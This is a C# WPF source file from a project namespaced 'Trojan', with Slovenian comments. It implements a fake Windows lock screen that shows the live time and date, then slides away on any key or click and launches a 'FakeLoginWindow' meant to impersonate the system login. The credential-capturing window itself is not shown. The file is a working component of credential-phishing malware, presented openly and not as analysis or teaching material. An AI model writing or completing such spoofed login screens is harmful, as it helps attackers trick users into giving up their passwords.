using System;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Threading;

namespace Trojan.Views
{
    public partial class ImageOverlayWindow : Window
    {
        private DispatcherTimer _timer;
        private bool _animating;

        public ImageOverlayWindow()
        {
            InitializeComponent();

            UpdateDateTime();

            _timer = new DispatcherTimer();
            _timer.Interval = TimeSpan.FromSeconds(1);
            _timer.Tick += (s, e) => UpdateDateTime();
            _timer.Start();

            KeyDown += OnAnyKeyPressed;
            MouseDown += OnAnyKeyPressed;
        }

        private async void OnAnyKeyPressed(object sender, EventArgs e)
        {
            if (_animating)
                return;

            _animating = true;

            KeyDown -= OnAnyKeyPressed;
            MouseDown -= OnAnyKeyPressed;

            _timer.Stop();

            // animacija
            var transform = new TranslateTransform();
            RootGrid.RenderTransform = transform;

            var slide = new DoubleAnimation
            {
                From = 0,
                To = -SystemParameters.PrimaryScreenHeight,
                Duration = TimeSpan.FromMilliseconds(700),
                EasingFunction = new CubicEase
                {
                    EasingMode = EasingMode.EaseOut
                }
            };

            transform.BeginAnimation(TranslateTransform.YProperty, slide);

            // login odpri malo kasneje
            await Task.Delay(120);

            var fakeLogin = new FakeLoginWindow();
            fakeLogin.Show();

            // lockscreen ostane nad njim
            Activate();

            await Task.Delay(580);

            Close();
        }

        private void UpdateDateTime()
        {
            TimeText.Text = DateTime.Now.ToString("H:mm");
            DateText.Text = DateTime.Now.ToString("dddd, MMMM dd");
        }
    }
}